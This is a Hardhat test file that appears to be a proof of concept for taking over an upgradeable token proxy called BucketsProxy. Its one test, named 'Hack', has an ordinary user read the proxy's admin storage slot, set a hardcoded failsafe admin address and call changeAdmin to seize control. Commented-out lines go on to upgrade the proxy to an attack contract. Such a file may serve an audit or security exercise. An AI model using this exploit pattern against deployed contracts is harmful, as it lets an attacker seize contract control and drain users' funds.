import { BigNumber, BigNumberish } from 'ethers'

import { Buckets, BucketsProxy, Buckets__factory, BucketsAttack } from '../typechain'
import { HARDHAT_ACCS_PUB_KEYS } from '../hardhat.config'

import { expect } from 'chai'

import { setupUser, setupUsers } from './utils/index'
import { ethers, deployments, getNamedAccounts, getUnnamedAccounts, time, network } from 'hardhat'
import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'

const nonExistentFuncSignature = 'nonExistentFunction(uint256,uint256)'

async function setup() {
  await deployments.fixture(['Buckets', 'BucketsProxy', 'BucketsAttack'])

  const contracts = {
    buckets: (await ethers.getContract('Buckets')) as Buckets,
    proxy: (await ethers.getContract('BucketsProxy')) as BucketsProxy,
    attack: (await ethers.getContract('BucketsAttack')) as BucketsAttack,
  }

  const { deployer, backend, feeAddress } = await getNamedAccounts()
  const users = await setupUsers(await getUnnamedAccounts(), contracts)
  return {
    ...contracts,
    users,
    deployer: await setupUser(deployer, contracts),
    backend: await setupUser(backend, contracts),
    feeAddress: await setupUser(feeAddress, contracts),
  }
}

describe('Example unit test', () => {
  const token = BigNumber.from(10).pow(18)
  describe('Constructor', () => {
    it('Hack', async () => {
      const { buckets, proxy, attack, deployer, backend, feeAddress, users } = await setup()
      let bucketsContract = Buckets__factory.connect(proxy.address, await ethers.getSigner(users[0].address))
      console.log(BNToNumstr(await bucketsContract.totalSupply(), 18, 3))
      // await users[0].proxy.changeAdmin()
      // await users[0].proxy.setFailsafeAdmin(BigNumber.from("0000000000000000000000000xf22a4bf45bbfde23c9ebf64357dfde96a5aefad4"))
      // await users[0].proxy.changeAdmin()
      console.log(await ethers.provider.getStorageAt(proxy.address, "0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103"));
      
      await users[0].proxy.setFailsafeAdmin(BigNumber.from(ethers.utils.hexValue("0x000000000000000000000000f22a4bf45bbfde23c9ebf64357dfde96a5aefad4")))
      await users[0].proxy.changeAdmin()
      // await users[0].proxy.upgradeTo(attack.address)
      // bucketsContract = Buckets__factory.connect(attack.address, ethers.provider)
      // console.log(BNToNumstr(await bucketsContract.totalSupply(), 18, 3))
    })
  })
})
